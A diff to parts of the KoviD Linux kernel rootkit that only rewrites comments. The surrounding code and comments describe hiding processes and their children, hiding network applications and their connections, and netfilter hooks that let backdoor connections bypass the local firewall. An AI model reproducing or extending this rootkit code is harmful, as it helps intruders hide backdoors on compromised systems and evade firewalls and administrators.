@@ -106,10 +106,9 @@ static void _cleanup_node_list(struct task_struct *task) {
     }
 }
 
-/**
- * If the task being unhidden is a backdoor then
- * it must be killed, in no way I want a backdoor
- * hanging around
+/*
+ * If the task being unhidden is a backdoor, it must be terminated to ensure
+ * there are no lingering backdoors left active.
  */
 static inline void _kill_task(struct task_struct *task) {
     if(!send_sig(SIGKILL, task, 0) == 0)
@@ -133,14 +132,16 @@ static int _unhide_task(void *data) {
     kaddr->k_attach_pid(task, PIDTYPE_PID);
 #endif
 
-    /**
-     * For active backdoors, saddr should match the active outgoing
-     * connection. In sock.c I keep references for them in a list,that is needed
-     * because of active nf hooks that bypass the local firewall, so for each packet
-     * coming to a destination I can distinguish if that packet belongs to a backdoor.
-     * If there are nettfilter rules blocking that connection, they will be bypassed and
-     * the connection will flow normally, but if the backdoor task is being unhidden then
-     * I need to cleanup that reference because the task will be killed right after.
+    /*
+     * For active backdoors, 'saddr' should match the active outgoing
+     * connection. In sock.c, references for these backdoors are maintained in a list.
+     * This is necessary due to active nf hooks that bypass the local firewall.
+     * This list allows for distinguishing packets that belong to a backdoor.
+     *
+     * If there are netfilter rules blocking the connection, they will be bypassed,
+     * and the connection will proceed as normal. However, when a backdoor task
+     * is being unhidden, the reference to that task needs to be cleaned up
+     * since the task will be terminated shortly.
      */
     if (ht->saddr) {
         kv_bd_cleanup_item(&ht->saddr);
@@ -166,15 +167,15 @@ static void _select_children(struct task_struct *task) {
     struct list_head *list;
     struct to_hide_tasks *tht = kcalloc(1, sizeof(struct to_hide_tasks), GFP_KERNEL);
 
-    /**
-    *  So here I first get the list of children and in
-    *  _fetch_children_and_hide_tasks() I traverse the list in
-    *  reverse, hiding one by one. Safer than the obvious approach
-    *  which would be to simultaneously list & hide
-    *
-    * However the cost of this operation, this is called
-    * only from userland interface
-    */
+    /*
+     * Here, I begin by obtaining the list of child tasks.
+     * In the _fetch_children_and_hide_tasks() function, I iterate through this list
+     * in reverse order, hiding one task at a time. This method is chosen for safety
+     * reasons, as it's safer than simultaneously listing and hiding tasks.
+     *
+     * It's worth noting that this operation is relatively costly and is exclusively
+     * invoked from the userland interface.
+     */
     if (tht) {
         tht->task = task;
         list_add_tail(&tht->list, &children_node);
@@ -444,18 +445,15 @@ bool kv_for_each_hidden_backdoor_data(bool (*cb)(__be32, void *), void *priv) {
     return false;
 }
 
-/**
- * This function runs once at init time
- * Ideally this will hide a network application such
- * as a tunnel or an external backdoor-like application,
- * other than the built-in ones
+/*
+ * This function runs once during initialization.
+ * Its primary purpose is to hide network applications, such as tunnels
+ * or external backdoor-like applications, except for the built-in ones.
  *
- * It scans all processes running on the system
- * at the time kovid is loaded.
- *
- * Network applications handled here will have
- * their connections hidden as well
- * @see netapp.h
+ * It performs a comprehensive scan of all processes that are running on
+ * the system when KoviD module is loaded. It is important to note
+ * that this function also conceals the connections of network applications.
+ * For more information, refer to 'netapp.h'.
  */
 void kv_scan_and_hide_netapp(void) {
     struct task_struct *t;
